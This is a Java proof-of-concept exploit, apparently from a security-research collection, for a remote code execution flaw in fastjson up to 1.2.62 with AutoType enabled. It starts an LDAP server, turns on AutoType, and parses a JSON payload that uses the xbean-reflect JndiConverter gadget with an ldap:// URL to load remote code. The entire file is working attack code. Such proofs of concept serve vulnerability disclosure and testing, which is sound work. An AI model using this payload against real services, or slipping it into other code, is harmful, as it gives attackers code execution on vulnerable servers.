package com.threedr3am.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.LdapServer;

/**
 * fastjson <= 1.2.62 RCE，需要开启AutoType (report by threedr3am to ASRC)
 *
 * Jackson-databind的CVE-2020-8840 gadget与Fastjson通用
 *
 * XBean-reflect依赖的gadget
 *
 * <dependency>
 *       <groupId>org.apache.xbean</groupId>
 *       <artifactId>xbean-reflect</artifactId>
 * </dependency>
 *
 * @author threedr3am
 */
public class JndiConverterPoc {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

    String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"}";//ldap方式
    JSON.parse(payload);
  }
}
